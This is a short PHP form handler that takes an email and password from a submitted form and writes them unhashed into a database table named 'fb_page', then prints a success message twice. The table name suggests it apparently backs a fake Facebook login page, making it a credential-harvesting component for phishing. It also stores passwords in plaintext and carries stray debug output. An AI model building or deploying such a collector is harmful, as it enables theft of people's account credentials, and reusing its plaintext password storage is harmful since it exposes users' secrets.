<?php
echo "<font color='green'>php";
include_once("config.php");
echo "<font color='green'>php";
 if(isset($_POST['Submit']))
 { 
 $email= mysqli_real_escape_string($mysqli,$_POST['email']);
 $password= mysqli_real_escape_string($mysqli,$_POST['password']); 


 // checking empty fields
	if(empty($password) || empty($email)) {
				
		if(empty($email)) {
			echo "<font color='red'>email field is empty.</font><br/>";
		}		
		if(empty($password)) {
			echo "<font color='red'>password field is empty.</font><br/>";
		}
	} 
	else { 
		// if all the fields are filled (not empty) 
		//insert data to database	
		$result = mysqli_query($mysqli, "INSERT INTO
		fb_page(email,password) VALUES('$email','$password')");
		
		//display success message
		echo "<font color='green'>Data added successfully.";
	}
 echo"<font color='green'>Data added sucessfully.";
 }
 ?>